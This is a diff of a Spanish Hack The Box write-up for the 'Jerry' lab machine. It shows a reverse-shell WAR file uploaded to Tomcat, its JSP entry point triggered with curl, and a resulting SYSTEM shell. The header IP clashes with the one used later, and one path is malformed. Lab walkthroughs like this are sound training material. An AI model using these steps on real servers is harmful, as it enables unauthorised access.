@@ -1,5 +1,5 @@
 ## HTB-Jerry
-- Maquina: Linux
+- Maquina: Windows
 - Level: Easy
 - IP: 10.10.10.14
 
@@ -43,13 +43,24 @@ subimos nuestra shell `rs_r0ok1e.war` a `WAR FILE TO DEPLOY`.
 Una ves tengamos el archivo cargado, ejecutamos lo siguiente:
 ```
 jar -tf rs_r0ok1e.war
+META-INF/
+META-INF/MANIFEST.MF
+WEB-INF/
+WEB-INF/web.xml
+wdwxbdssjlo.jsp
 ```
-Esto arrojara un output de lo cual solo nos interesa el nombre que termine con `.jsp` en mi caso fue **wdwxbdssjlo.jsp**
+De todo esto solo nos interesa el nombre que termine con `.jsp` en mi caso fue **wdwxbdssjlo.jsp**
 Luego en ejecutamos:
 ```
 curl http://10.10.10.95:8080/rs_r0ok1e/wdwxbdssjlo.jsp
 ```
-Listo, Ya logramos acceder a jerry y nuestras flags estan en:
+Listo, Ya logramos acceder a jerry.
+```
+C:\apache-tomcat-7.0.88>whoami
+whoami
+nt authority\system
+```
+iremos a ahora:
 ```
 cd C\Users\Administrator\Desktop\flags\
 ```
